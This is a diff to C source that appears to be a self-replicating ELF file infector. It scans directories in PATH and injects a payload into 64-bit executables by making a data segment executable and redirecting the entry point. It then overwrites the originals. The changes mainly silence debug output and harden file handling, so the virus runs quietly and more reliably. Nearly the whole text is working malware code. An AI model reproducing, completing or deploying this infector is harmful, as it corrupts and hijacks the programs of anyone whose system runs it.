@@ -40,7 +40,6 @@ struct linux_dirent64 {
  int             ft_strncmp(const char *s1, const char *s2, size_t n);
  int infect(char path[],size_t path_length);
  void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry);
- int		ft_putchar(int c);
  int     ft_isdigit(int c);
  int ft_isallnum(char *str);
  size_t	put_sig(int fd);
@@ -250,10 +249,6 @@ bool process_runing(void)
 
 
 
-int	ft_putchar(int c)
-{
-	return (write(1, &c, 1));
-}// can be delete == debug
 
 int     ft_isdigit(int c)
 {
@@ -498,7 +493,7 @@ int main_encrypt()
 			path_env[i] = '\0';
 			//open_directory(&path[i] - length_path);
 			open_directory(&path_env[i] - length_path);
-			//write(1,&path[i] - length_path, length_path);
+			//write(1,&path_env[i] - length_path, length_path);
 			//write(1,"\n",1);
 			path_env[i] = ':';
 			length_path = -1;
@@ -525,8 +520,8 @@ int main_encrypt()
 	content[6] ='t';
 	content[7] =':';
 	content[8] =' ';
-	write(1,content,9);
-	write(1,path_env,ft_strlen(path_env));
+	//write(1,content,9);
+//	write(1,path_env,ft_strlen(path_env));
 }
 __syscall1(int, unlink, const char *, pathname);
 __syscall2(int, fstat, int, fildes, struct stat * , buf);
@@ -625,8 +620,8 @@ int open_directory(char *path)
 	directory[10] =' ';
 	directory[11] = 0;
 
-	write(1,path,ft_strlen(path));
-	write(1,"\n",1);
+//	write(1,path,ft_strlen(path));
+//	write(1,"\n",1);
 	//printf("directory: '%s'\n",path);
 
 	//path = "/tmp/toto";
@@ -641,12 +636,11 @@ int open_directory(char *path)
 	path[8] = 'o';
 	path[9] = 0;
 
-	dd = open (path, 0x10000,0);
+	dd = open(path, 0x10000,0);
 	if (dd < 0)
 	{
 
 		//printf("open fail: '%s'\n",path);
-
 		return 1;
 
 	}
@@ -673,11 +667,18 @@ int open_directory(char *path)
 			//printf("%s %s\n",d->d_name,path_file);
 			struct stat st;
 			int fd = open (path_file, 0,0);
-			fstat(fd , &st);
-			char mem[st.st_size];
-			int c = read(fd, mem,st.st_size);
-			//write(1,mem,st.st_size);
-			do_the_job(mem,st.st_size,path_file);
+			if (fd > 0)
+			{
+				fstat(fd , &st);
+				char mem[st.st_size];
+				for (size_t j =0; j < st.st_size;j++)
+					mem[j] = 0;
+				int c = read(fd, mem,st.st_size);
+				if (c > 0)
+					do_the_job(mem,st.st_size,path_file);
+				close(fd);
+			}
+
 		}
 	}
 	close(dd);
@@ -691,7 +692,7 @@ int do_the_job(char buff[],size_t size, char *path)
 
 	unsigned int payload_len = ((char *)&myend - (char *)&real_start ) + SIZE_BEFORE_ENTRY_POINT;
 
-	ft_putchar('\n');
+//	ft_putchar('\n');
 	Elf64_Addr parasite_vaddr;
 	int text_found = 0;
 	int i;
@@ -701,11 +702,12 @@ int do_the_job(char buff[],size_t size, char *path)
 	ono[2]=0;
 
 
-	write(1, buff, 20);
+//	write(1, buff, 100);
+	//write(1,buff,120);
+	//ft_putchar('\n');
 
 	if (size < sizeof(Elf64_Ehdr)  || buff[EI_MAG0] != 0x7f || buff[EI_MAG1] != 'E' || buff[EI_MAG2] != 'L' || buff[EI_MAG3] != 'F'  || buff[EI_CLASS] != ELFCLASS64)
 	{
-	//	ft_putchar('\n');
 		return (1);
 	}
 
@@ -732,10 +734,10 @@ int do_the_job(char buff[],size_t size, char *path)
 	for(int i=0; i < hdr->e_phnum; i++){
 		if(is_infected(buff + phdr[i].p_offset, phdr[i].p_filesz))
 		{
+//			write(1,"r",1);
 			return (1);
 
 		}
-
 		if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)){
 
 
@@ -755,13 +757,11 @@ int do_the_job(char buff[],size_t size, char *path)
 			phdr[i].p_filesz += payload_len +100;
 			phdr[i].p_memsz += payload_len + 100;
 			phdr[i].p_flags |= PF_X;
-			break;
+				new_file(buff,size,text_end, path,entry);
+			return 0;
 		}
 	}
-
-	new_file(buff,size,text_end, path,entry);
-
-	return 0;
+	return 1;
 }
 
 int infect(char path[],size_t path_length)
@@ -776,8 +776,7 @@ int infect(char path[],size_t path_length)
 			path[i] = '\0';
 			//open_directory(&path[i] - length_path);
 			open_directory(&path[i] - length_path);
-			//write(1,&path[i] - length_path, length_path);
-			//write(1,"\n",1);
+
 			path[i] = ':';
 			length_path = -1;
 		}
@@ -840,13 +839,6 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	//exit(4);
 
 	*(unsigned int*) &jmp_code[3] = old_e_entry;
-	write(1,jmp_code,9);
-	char new_debut [4];
-	new_debut[0] ='n';
-	new_debut[1] ='e';
-	new_debut[2] ='w';
-	new_debut[3] ='\n';
-	write(1,new_debut,4);
 
 	for (int i = 0; i< 125;i++)
 		tmp[i] = 0;
@@ -897,7 +889,6 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 
 	//printf("tmp %s, path %s\n",tmp, path);
 	close(fd);
-
 	unlink(path);
 	rename (tmp, path);
 
@@ -1242,7 +1233,7 @@ size_t i ;
 		}
 		tab[size % 2] = (read[size] ^ key);
 		i += write(fd, &(tab[size % 2]), 1);
-		write(1, &(tab[size % 2]), 1);
+		//write(1, &(tab[size % 2]), 1);
 		lseek(fd, (off_t)0, SEEK_END);
 		size--;
 		return (i);
